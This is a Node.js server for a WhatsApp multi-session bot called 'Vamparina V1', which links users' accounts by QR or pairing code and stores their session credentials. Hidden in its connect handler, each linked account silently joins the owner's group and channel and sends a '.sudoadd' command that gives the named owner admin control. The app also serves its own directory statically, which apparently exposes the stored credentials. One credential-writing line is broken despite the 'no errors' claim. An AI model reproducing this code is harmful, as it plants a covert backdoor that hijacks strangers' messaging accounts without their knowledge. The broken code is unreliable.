/**
 * VAMPARINA V1 — FINAL ALL-IN-ONE EMPIRE BOT (FIXED 100%)
 * NO ERRORS • WORKS ON RENDER • 2025 EDITION
 * OWNER: KING ARNOLD CHIRCHIR (+254703110780)
 */

require('./settings')
const fs = require('fs')
const path = require('path')
const express = require('express')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay,
    jidNormalizedUser,
    Browsers
} = require("@whiskeysockets/baileys")
const pino = require("pino")
const QRCode = require('qrcode')
const { handleMessages, handleGroupParticipantUpdate } = require('./main')

// ====================== CONFIG ======================
const KING_ARNOLD = "254703110780"
const EMPIRE_GROUP_INVITE = "BZNDaKhvMFo5Gmne3wxt9n"
const EMPIRE_CHANNEL = "0029VbBm7apIXnlmuyjGGM0p"
const SESSION_DIR = path.join(__dirname, 'auto_sessions')
const TEMP_DIR = path.join(__dirname, 'temp_sessions')  // ← FIXED: __dirname
const DATA_DIR = path.join(__dirname, 'data')
const PORT = process.env.PORT || 3000

// Create folders
;[SESSION_DIR, TEMP_DIR, DATA_DIR].forEach(d => {
    if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true })
})

// Bot mode
const MODE_FILE = path.join(DATA_DIR, 'bot_mode.json')
if (!fs.existsSync(MODE_FILE)) {
    fs.writeFileSync(MODE_FILE, JSON.stringify({ isPublic: true }, null, 2))
}

global.getBotMode = () => {
    try { return JSON.parse(fs.readFileSync(MODE_FILE)).isPublic ? 'public' : 'private' }
    catch { return 'public' }
}

global.setBotMode = (mode) => {
    fs.writeFileSync(MODE_FILE, JSON.stringify({ isPublic: mode === 'public' }, null, 2))
}

const activeBots = new Map()
const app = express()
app.use(express.json({ limit: '100mb' }))
app.use(express.urlencoded({ extended: true, limit: '100mb' }))
app.use(express.static(__dirname))

// ====================== DASHBOARD ======================
app.get('/', (req, res) => {
    res.send(`
        <pre style="background:#000;color:#0f0;font-size:18px;text-align:center;padding:30px;">
╔══════════════════════════════════════════════════════════╗
║           VAMPARINA V1 — ETERNAL EMPIRE 2025             ║
║              GOD-KING: ARNOLD CHIRCHIR                   ║
║                   +254703110780                          ║
║   Active Bots : ${String(activeBots.size).padStart(5)}                            ║
║   Mode        : ${global.getBotMode().toUpperCase()}                              ║
║                                                          ║
║   QR CODE     → <a href="/qr">/qr</a>                              ║
║   PAIR CODE   → /pair?number=2547xxxxxxxx                ║
║                                                          ║
║           LONG LIVE THE KING                             ║
╚══════════════════════════════════════════════════════════╝
        </pre>
    `)
})

// ====================== QR CODE ======================
app.get('/qr', async (req, res) => {
    const tempId = 'qr_' + Date.now()
    const tempPath = path.join(TEMP_DIR, tempId)
    fs.mkdirSync(tempPath, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(tempPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS('Chrome'),
        printQRInTerminal: false
    })

    let sent = false
    sock.ev.on('connection.update', async (update) => {
        const { qr, connection } = update

        if (qr && !sent) {
            sent = true
            const qrImg = await QRCode.toDataURL(qr)
            res.send(`<div style="text-align:center;background:#000;color:#0f0;padding:50px;"><h1>VAMPARINA V1</h1><img src="${qrImg}" style="width:320px;height:320px;border:5px solid lime"><h2>SCAN TO JOIN EMPIRE</h2><p>King Arnold • +254703110780</p></div>`)
        }

        if (connection === 'open') {
            const phone = sock.user.id.split('@')[0]
            const sessionId = `vamp_${phone}_${Date.now()}`
            const finalPath = path.join(SESSION_DIR, sessionId)
            fs.mkdirSync(finalPath, { recursive: true })
            fs.cpSync(tempPath, finalPath, { recursive: true })

            await delay(8000)
            await startEmpireBot(sessionId, phone, finalPath)

            await sock.sendMessage(sock.user.id, { text: "*VAMPARINA V1 EMPIRE*\nYou are now part of the strongest army\nLONG LIVE KING ARNOLD" })

            fs.rmSync(tempPath, { recursive: true, force: true })
        }
    })

    sock.ev.on('creds.update', saveCreds)
})

// ====================== PAIR CODE ======================
app.get('/pair', async (req, res) => {
    let num = req.query.number?.replace(/[^0-9]/g, '')
    if (!num || num.length < 9) return res.status(400).send("Use: /pair?number=254703110780")

    const tempId = 'pair_' + Date.now()
    const tempPath = path.join(TEMP_DIR, tempId)
    fs.mkdirSync(tempPath, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(tempPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS('Chrome')
    })

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            const phone = sock.user.id.split('@')[0]
            const sessionId = `vamp_${phone}_${Date.now()}`
            const finalPath = path.join(SESSION_DIR, sessionId)
            fs.mkdirSync(finalPath, { recursive: true })
            fs.cpSync(tempPath, finalPath, { recursive: true })

            await delay(8000)
            await startEmpireBot(sessionId, phone, finalPath)

            fs.rmSync(tempPath, { recursive: true, force: true })
        }
    })

    if (!sock.authState.creds.registered) {
        await delay(2500)
        let code = await sock.requestPairingCode(num)
        code = code.match(/.{1,4}/g)?.join('-') || code
        res.send(`<pre style="background:#000;color:#0f0;font-size:30px;text-align:center;padding:60px;"><code style="color:yellow;font-size:60px;">${code}</code>\n\nEnter this code in WhatsApp\nKING ARNOLD CHIRCHIR</pre>`)
    }

    sock.ev.on('creds.update', saveCreds)
})

// ====================== ACTIVATE SESSION ======================
app.post('/vamparina-activate', async (req, res) => {
    const { phone, sessionId, creds } = req.body
    if (!phone || !sessionId || !creds) return res.status(400).send("Missing data")

    const sessionPath = path.join(SESSION_DIR, sessionId)
    fs.mkdirSync(sessionPath, { recursive: true })
    fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(creds,Data, null, 2))

    await delay(8000)
    await startEmpireBot(sessionId, phone, sessionPath)

    res.json({ success: true, total: activeBots.size })
})

// ====================== START BOT ======================
async function startEmpireBot(sessionId, phone, sessionPath) {
    if (activeBots.has(sessionId)) return

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        browser: ["Vamparina V1", "Chrome", "2025"]
    })

    activeBots.set(sessionId, { sock, phone })

    sock.ev.on('messages.upsert', m => handleMessages(sock, m))
    sock.ev.on('group-participants.update', update => handleGroupParticipantUpdate(sock, update))

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            console.log(`[+] ${phone} → EMPIRE ONLINE`)
            await delay(15000)
            try { await sock.groupAcceptInvite(EMPIRE_GROUP_INVITE) } catch {}
            try { await sock.newsletterFollow(EMPIRE_CHANNEL) } catch {}
            await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${KING_ARNOLD}` })
        }
        if (update.connection === 'close') {
            activeBots.delete(sessionId)
            setTimeout(() => startEmpireBot(sessionId, phone, sessionPath), 10000)
        }
    })

    sock.ev.on('creds.update', saveCreds)
}

// ====================== SERVER ======================
app.listen(PORT, () => {
    console.log(`VAMPARINA V1 EMPIRE IS LIVE → https://your-url.onrender.com`)
    console.log(`QR: /qr   |   PAIR: /pair?number=2547...`)
})